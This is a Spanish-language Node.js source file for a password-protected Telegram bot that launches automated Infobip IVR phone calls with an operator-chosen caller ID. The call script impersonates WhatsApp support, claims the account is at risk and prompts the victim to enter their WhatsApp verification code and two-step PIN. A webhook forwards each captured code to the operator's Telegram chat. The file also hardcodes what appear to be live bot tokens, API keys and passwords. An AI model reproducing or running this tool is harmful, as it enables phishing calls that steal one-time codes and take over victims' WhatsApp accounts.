"use strict";

// =========================
// IMPORTACIONES
// =========================
const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const https = require("follow-redirects").https;

// =========================
// CONFIGURACIÓN INICIAL
// =========================
const TELEGRAM_BOT_TOKEN = "7521128407:AAH2E4SKkAgKiXrkIReQwufyLoQTcRp4bvk"; // Tu token de Telegram
const PORT = process.env.PORT || 3000;
const DEFAULT_API_KEY = "App e3daefcc80560f5b41fbaea5f57cf55d-37367689-0e5a-47ad-bf35-7f11679eb55d"; // API Key predeterminada SOLO para el admin
const INFOBIP_BASE_HOST = "pdl8re.api.infobip.com"; // Host de Infobip

// =========================
// ALMACENAMIENTO
// =========================
// Estructura de autenticación: { chatId: { authenticated, unlimited, admin, expiresAt, apiKey } }
const authenticatedUsers = {};
// Para comandos pendientes
const awaitingInput = {};
// Para relacionar scenarioId con el chatId del usuario que inició la llamada
const callRequests = {};

// =========================
// INICIALIZACIÓN DEL BOT DE TELEGRAM
// =========================
const bot = new Telegraf(TELEGRAM_BOT_TOKEN);

// Función para obtener la API Key del usuario
// Para el admin se utiliza la API Key predeterminada; para el resto, se debe haber configurado una propia.
// Además, si la API Key no incluye el prefijo "App ", se lo agrega automáticamente.
function getUserApiKey(chatId) {
  const user = authenticatedUsers[chatId];
  if (user && user.admin) {
    return DEFAULT_API_KEY;
  } else if (user && user.apiKey) {
    return user.apiKey.startsWith("App ") ? user.apiKey : "App " + user.apiKey;
  }
  return null;
}

// Middleware de autenticación
bot.use((ctx, next) => {
  if (ctx.message && ctx.message.text) {
    const chatId = ctx.chat.id;
    // Permitir /login y /start sin autenticación
    if (ctx.message.text.startsWith("/login") || ctx.message.text.startsWith("/start")) {
      return next();
    }
    // Si el usuario no está autenticado, se toma el mensaje como contraseña
    if (!authenticatedUsers[chatId] || !authenticatedUsers[chatId].authenticated) {
      const password = ctx.message.text.trim();
      if (password === "Mortadela1$") {
        // Administrador con acceso ilimitado
        authenticatedUsers[chatId] = { authenticated: true, unlimited: true, admin: true };
        ctx.replyWithHTML("<b>¡Bienvenido Administrador!</b> Tienes acceso ilimitado 😎", Markup.removeKeyboard());
        return;
      } else if (password === "PapaHelado4") {
        // Usuario con acceso limitado (hasta el 18 de marzo)
        let currentYear = new Date().getFullYear();
        let expirationDate = new Date(`${currentYear}-03-18T23:59:59`);
        if (new Date() > expirationDate) {
          expirationDate = new Date(`${currentYear + 1}-03-18T23:59:59`);
        }
        authenticatedUsers[chatId] = { authenticated: true, unlimited: false, admin: false, expiresAt: expirationDate };
        ctx.replyWithHTML("<b>¡Bienvenido Usuario!</b> Realiza llamadas a cualquier parte del mundo ⏳", Markup.removeKeyboard());
        return;
      } else {
        ctx.reply("❌ Contraseña incorrecta. Por favor, intenta de nuevo.");
        return;
      }
    } else {
      // Verifica expiración si el acceso es limitado
      if (!authenticatedUsers[chatId].unlimited) {
        const now = new Date();
        if (now > authenticatedUsers[chatId].expiresAt) {
          ctx.reply("⚠️ Tu acceso ha expirado. Por favor, vuelve a autenticarte.");
          authenticatedUsers[chatId] = { authenticated: false };
          return;
        }
      }
    }
  }
  return next();
});

// =========================
// COMANDOS DEL BOT
// =========================

// Comando /login
bot.command("login", (ctx) => {
  ctx.reply("🔒 Por favor, ingresa la contraseña:");
});

// Comando /start
bot.start((ctx) => {
  const chatId = ctx.chat.id;
  if (!authenticatedUsers[chatId] || !authenticatedUsers[chatId].authenticated) {
    ctx.reply("🔑 Por favor, ingresa la contraseña para acceder al bot:");
  } else {
    ctx.replyWithHTML(
      "<b>Bienvenido al Bot de WhatsApp/Infobip</b> 🌟\nSelecciona una opción:",
      Markup.keyboard([["📞 Realizar llamada", "🔧 Cambiar API"]]).resize()
    );
  }
});

// Permitir cambiar la API Key
bot.hears("🔧 Cambiar API", (ctx) => {
  awaitingInput[ctx.chat.id] = { type: "change_api" };
  ctx.reply("📝 Envíame la nueva API Key de Infobip:");
});

// Realizar llamada: se consultan los números disponibles según la API Key del usuario
bot.hears("📞 Realizar llamada", (ctx) => {
  const chatId = ctx.chat.id;
  const userApiKey = getUserApiKey(chatId);
  // Para usuarios no admin se fuerza a tener una API Key propia configurada
  if (!authenticatedUsers[chatId].admin && !userApiKey) {
    ctx.reply("⚠️ Debes configurar tu propia API Key usando el comando 🔧 Cambiar API antes de realizar llamadas.");
    return;
  }
  // Se pide directamente el número de origen al usuario
  awaitingInput[chatId] = { type: "enter_from_number" };
  ctx.reply("📞 Ingresa el número de origen (con código de país, ej: +5491112345678):", Markup.removeKeyboard());
});

// Procesamiento de mensajes pendientes
bot.on("text", (ctx, next) => {
  const chatId = ctx.chat.id;
  if (awaitingInput[chatId]) {
    const input = ctx.message.text.trim();
    if (awaitingInput[chatId].type === "change_api") {
      // Actualiza la API Key del usuario
      authenticatedUsers[chatId].apiKey = input;
      ctx.reply(`✅ Tu API Key ha sido actualizada a: <code>${input}</code>`);
      delete awaitingInput[chatId];
      return;
    } else if (awaitingInput[chatId].type === "enter_from_number") {
      // El usuario escribe manualmente el número de origen
      awaitingInput[chatId] = { type: "call", fromNumber: input };
      ctx.reply("📲 Ahora, ingresa el número de destino al que deseas llamar:");
      return;
    } else if (awaitingInput[chatId].type === "call") {
      // Se obtiene el número destino y se inicia la llamada
      const fromNumber = awaitingInput[chatId].fromNumber;
      ctx.reply(`📞 Número de destino ingresado: <b>${input}</b>\nIniciando llamada desde <b>${fromNumber}</b>...`);
      initiateCall(chatId, input, fromNumber);
      delete awaitingInput[chatId];
      return;
    }
  } else {
    return next();
  }
});

// =========================
// FUNCIONES AUXILIARES
// =========================

// Función para consultar los números disponibles usando el endpoint del ejemplo de Node.js
function getAvailableNumbers(apiKey, callback) {
  const options = {
    method: "GET",
    hostname: INFOBIP_BASE_HOST,
    path: "/numbers/1/numbers", // Endpoint del ejemplo
    headers: {
      Authorization: apiKey,
      Accept: "application/json"
    },
    maxRedirects: 20
  };

  const req = https.request(options, function (res) {
    let chunks = [];
    res.on("data", function (chunk) {
      chunks.push(chunk);
    });
    res.on("end", function () {
      // Se verifica que el status sea 200 OK
      if (res.statusCode !== 200) {
        callback(new Error(`HTTP ${res.statusCode}: ${Buffer.concat(chunks).toString()}`));
        return;
      }
      const body = Buffer.concat(chunks).toString();
      try {
        const json = JSON.parse(body);
        if (!json.numbers) {
          callback(new Error("No se encontró la propiedad 'numbers' en la respuesta."));
          return;
        }
        // Se extraen los números de cada objeto (del campo "number")
        const numbers = json.numbers.map(item => item.number);
        callback(null, numbers);
      } catch (e) {
        callback(e);
      }
    });
    res.on("error", function (error) {
      callback(error);
    });
  });

  req.end();
}

// =========================
// FUNCIONES PARA REALIZAR LA LLAMADA (IVR)
// =========================

const voiceOptions = {
  language: "es",
  gender: "female"
};

function initiateCall(chatId, targetNumber, fromNumber) {
  const scenarioPayload = {
    name: "Verificación de cuenta WhatsApp",
    description: "Flujo interactivo que integra captura inmediata de DTMF/voz y notifica cada interacción en tiempo real.",
    script: [
      {
        repeat: [
          {
            say:
              "Hola ${userNameVariable}. Este es un comunicado importante desde el soporte técnico de WhatsApp. De no realizar esta verificación, podría estar en peligro su cuenta, hemos detectado actividades inusuales en su cuenta de WhatsApp. Si usted ha realizado una solicitud en un nuevo dispositivo, presione 1. De lo contrario, presione 2. Si desea repetir el comunicado, presione 3.",
            options: voiceOptions
          },
          {
            collectInto: "initialOption",
            options: {
              maxInputLength: 1,
              timeout: 5,
              sendToReports: "ALWAYS"
            }
          }
        ],
        while: "${initialOption != '1' && initialOption != '2'}"
      },
      {
        say: "Ha presionado ${initialOption}.",
        options: voiceOptions
      },
      {
        say:
          "Le hemos enviado un código de verificación de 6 dígitos a su número de teléfono registrado. Por favor, verifique sus notificaciones o la pantalla de su WhatsApp y digite el código proporcionado.",
        options: voiceOptions
      },
      {
        collectInto: "verificationCode",
        options: {
          maxInputLength: 6,
          timeout: 10,
          sendToReports: "ALWAYS"
        }
      },
      {
        request: "https://example.com/verify",
        options: {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: { verificationCode: "${verificationCode}" }
        }
      },
      {
        repeat: [
          {
            say:
              "Si su cuenta cuenta con verificación de dos pasos, presione 1. De lo contrario, presione 2.",
            options: voiceOptions
          },
          {
            collectInto: "twoStepOption",
            options: {
              maxInputLength: 1,
              timeout: 5,
              sendToReports: "ALWAYS"
            }
          }
        ],
        while: "${twoStepOption != '1' && twoStepOption != '2'}"
      },
      {
        if: "${twoStepOption == '1'}",
        then: [
          {
            say:
              "Para verificar su identidad, por favor, introduzca el código de verificación de dos pasos de 6 dígitos anteriormente configurado en su cuenta.",
            options: voiceOptions
          },
          {
            collectInto: "twoStepCode",
            options: {
              maxInputLength: 6,
              timeout: 10,
              sendToReports: "ALWAYS"
            }
          },
          {
            say: "Código de dos pasos recibido. Gracias por su verificación.",
            options: voiceOptions
          }
        ]
      },
      {
        if: "${twoStepOption == '2'}",
        then: [
          {
            say:
              "Por favor, configure su nuevo pin de 6 dígitos de verificación de dos pasos.",
            options: voiceOptions
          },
          {
            collectInto: "newTwoStepPin",
            options: {
              maxInputLength: 6,
              timeout: 10,
              sendToReports: "ALWAYS"
            }
          },
          {
            say: "Nuevo pin configurado correctamente.",
            options: voiceOptions
          }
        ]
      },
      "hangup"
    ]
  };

  const scenarioOptions = {
    method: "POST",
    hostname: INFOBIP_BASE_HOST,
    path: "/voice/ivr/1/scenarios",
    headers: {
      Authorization: getUserApiKey(chatId),
      "Content-Type": "application/json",
      Accept: "application/json"
    },
    maxRedirects: 20
  };

  bot.telegram.sendMessage(chatId, "⏳ Creando escenario IVR...");

  const req = https.request(scenarioOptions, (res) => {
    let chunks = [];
    res.on("data", (chunk) => chunks.push(chunk));
    res.on("end", () => {
      const body = Buffer.concat(chunks).toString();
      bot.telegram.sendMessage(chatId, `📡 Respuesta del escenario: ${body}`);
      try {
        const json = JSON.parse(body);
        if (json && json.id) {
          sendCallMessage(chatId, json.id, targetNumber, fromNumber);
        } else {
          bot.telegram.sendMessage(chatId, "❌ No se recibió un ID de escenario válido.");
        }
      } catch (e) {
        bot.telegram.sendMessage(chatId, "❌ Error al parsear la respuesta del escenario.");
      }
    });
  });

  req.on("error", (error) => {
    bot.telegram.sendMessage(chatId, `❌ Error al crear escenario: ${error.message}`);
  });

  req.write(JSON.stringify(scenarioPayload));
  req.end();
}

function sendCallMessage(chatId, scenarioId, targetNumber, fromNumber) {
  // Se asocia el scenarioId con el chatId del usuario que realizó la llamada
  callRequests[scenarioId] = chatId;
  const bulkId = "BULK-ID-123-xyz";
  const messagePayload = {
    bulkId: bulkId,
    messages: [
      {
        scenarioId: scenarioId,
        from: fromNumber, // Se usa el número origen seleccionado por el usuario
        destinations: [{ to: targetNumber }],
        retry: { minPeriod: 1, maxPeriod: 5, maxCount: 5 },
        record: false,
        deliveryTimeWindow: {
          from: { hour: 0, minute: 0 },
          to: { hour: 23, minute: 59 },
          days: ["MONDAY", "TUESDAY", "WEDNESDAY", "THURSDAY", "FRIDAY", "SATURDAY", "SUNDAY"]
        },
        callbackUrl: "https://debonair-subsequent-gladiolus.glitch.me/infobip-webhook"
      }
    ]
  };

  bot.telegram.sendMessage(chatId, "🚀 Enviando mensaje de llamada...");

  const options = {
    method: "POST",
    hostname: INFOBIP_BASE_HOST,
    path: "/voice/ivr/1/messages",
    headers: {
      Authorization: getUserApiKey(chatId),
      "Content-Type": "application/json",
      Accept: "application/json"
    },
    maxRedirects: 20
  };

  const req = https.request(options, (res) => {
    let chunks = [];
    res.on("data", (chunk) => chunks.push(chunk));
    res.on("end", () => {
      const msgBody = Buffer.concat(chunks).toString();
      bot.telegram.sendMessage(chatId, `📨 Respuesta del mensaje: ${msgBody}`);
    });
  });

  req.on("error", (error) => {
    bot.telegram.sendMessage(chatId, `❌ Error al enviar mensaje: ${error.message}`);
  });

  req.write(JSON.stringify(messagePayload));
  req.end();
}

// =========================
// SERVIDOR EXPRESS Y WEBHOOK
// =========================
const app = express();
app.use(bodyParser.json());

app.post("/infobip-webhook", (req, res) => {
  console.log("Webhook recibido:", JSON.stringify(req.body, null, 2));
  const payload = req.body;

  // Se procesa cada evento si hay array "results"
  if (payload.results && Array.isArray(payload.results)) {
    payload.results.forEach((event) => {
      let scenarioId;
      if (event.voiceCall && event.voiceCall.ivr && event.voiceCall.ivr.scenarioId) {
        scenarioId = event.voiceCall.ivr.scenarioId;
      }
      const chatId = callRequests[scenarioId];
      const msg = processCallEvent(event);
      if (chatId) {
        bot.telegram.sendMessage(chatId, msg)
          .then(() => console.log("🔔 Notificación enviada a Telegram"))
          .catch((err) => console.error("❌ Error al enviar notificación a Telegram:", err));
        // Solo eliminamos la asociación si el evento indica que la llamada finalizó (ej. hangup)
        if (event.type && event.type === "hangup") {
          delete callRequests[scenarioId];
        }
      } else {
        console.error("No se encontró el chatId para scenarioId:", scenarioId);
      }
    });
  } else {
    let scenarioId;
    if (payload.voiceCall && payload.voiceCall.ivr && payload.voiceCall.ivr.scenarioId) {
      scenarioId = payload.voiceCall.ivr.scenarioId;
    }
    const chatId = callRequests[scenarioId];
    const msg = processCallEvent(payload);
    if (chatId) {
      bot.telegram.sendMessage(chatId, msg)
        .then(() => console.log("🔔 Notificación enviada a Telegram"))
        .catch((err) => console.error("❌ Error al enviar notificación a Telegram:", err));
      if (payload.type && payload.type === "hangup") {
        delete callRequests[scenarioId];
      }
    } else {
      console.error("No se encontró el chatId para scenarioId:", scenarioId);
    }
  }
  res.sendStatus(200);
});

// =========================
// FUNCIÓN PARA PROCESAR EVENTOS DE INFOBIP
// =========================
function processCallEvent(event) {
  let message = "";
  if (event.type) message += `Evento: ${event.type}\n`;
  if (event.callId) message += `Call ID: ${event.callId}\n`;
  if (event.timestamp) message += `Timestamp: ${event.timestamp}\n`;
  if (event.conferenceId) message += `Conference ID: ${event.conferenceId}\n`;
  if (event.callsConfigurationId) message += `Calls Configuration ID: ${event.callsConfigurationId}\n`;
  if (event.bulkId) message += `Bulk ID: ${event.bulkId}\n`;
  if (event.dialogId) message += `Dialog ID: ${event.dialogId}\n`;
  if (event.platform) {
    if (event.platform.entityId) message += `Entity ID: ${event.platform.entityId}\n`;
    if (event.platform.applicationId) message += `Application ID: ${event.platform.applicationId}\n`;
  }
  if (event.type) {
    switch (event.type) {
      case "SPEECH_CAPTURED":
        if (event.properties) {
          message += `Full text: ${event.properties.fullText}\n`;
          message += `Matched key phrase: ${event.properties.matchedKeyPhrase}\n`;
          message += `Confidence: ${event.properties.confidence}\n`;
          message += `Termination reason: ${event.properties.terminationReason}\n`;
        }
        break;
      case "DTMF_CAPTURED":
      case "DTMF":
      case "DTMF_RECEIVED":
        if (event.properties && event.properties.dtmf) {
          message += `DTMF digit received: ${event.properties.dtmf}\n`;
        } else {
          message += "Evento DTMF recibido pero sin dígito.\n";
        }
        if (event.properties && typeof event.properties.timeout !== "undefined") {
          message += `Timeout: ${event.properties.timeout}\n`;
        }
        if (event.properties && event.properties.playedContentProperties) {
          message += `Played duration: ${event.properties.playedContentProperties.duration}\n`;
          message += `Played completely: ${event.properties.playedContentProperties.playedCompletely}\n`;
        }
        break;
      case "INPUT_RECEIVED":
        if (event.properties && event.properties.collectedData) {
          for (const key in event.properties.collectedData) {
            message += `Input for ${key}: ${event.properties.collectedData[key]}\n`;
          }
        } else {
          message += "Evento INPUT recibido sin detalles.\n";
        }
        break;
      default:
        if (event.properties) {
          message += `Properties: ${JSON.stringify(event.properties, null, 2)}\n`;
        }
    }
  } else if (event.voiceCall && event.voiceCall.ivr && event.voiceCall.ivr.collectedDtmfs) {
    message += `Bulk ID: ${event.bulkId}\nFrom: ${event.from}\nTo: ${event.to}\n`;
    try {
      let dtmfData = JSON.parse(event.voiceCall.ivr.collectedDtmfs);
      if (dtmfData.initialOption && dtmfData.initialOption !== "null") {
        message += `Opción inicial presionada: ${dtmfData.initialOption}\n`;
      }
      if (dtmfData.verificationCode && dtmfData.verificationCode !== "") {
        message += `Código de verificación ingresado: ${dtmfData.verificationCode}\n`;
      }
      if (dtmfData.twoStepOption && dtmfData.twoStepOption !== "null") {
        message += `Opción de dos pasos: ${dtmfData.twoStepOption}\n`;
      }
      if (dtmfData.twoStepCode && dtmfData.twoStepCode !== "null") {
        message += `Código de dos pasos ingresado: ${dtmfData.twoStepCode}\n`;
      }
      if (dtmfData.newTwoStepPin && dtmfData.newTwoStepPin !== "null") {
        message += `Nuevo PIN configurado: ${dtmfData.newTwoStepPin}\n`;
      }
    } catch (err) {
      message += "Error parseando los DTMFs: " + err.message + "\n";
    }
  }
  if (!message || message.trim() === "") {
    message = "Evento recibido sin detalles: " + JSON.stringify(event, null, 2);
  }
  return message;
}

// =========================
// INICIALIZACIÓN DEL SERVIDOR EXPRESS Y DEL BOT
// =========================
app.listen(PORT, () => {
  console.log(`Servidor Express escuchando en el puerto ${PORT}`);
});

bot.launch()
  .then(() => {
    console.log("Bot de Telegram iniciado.");
  })
  .catch((err) => {
    console.error("Error al iniciar el bot de Telegram:", err);
  });
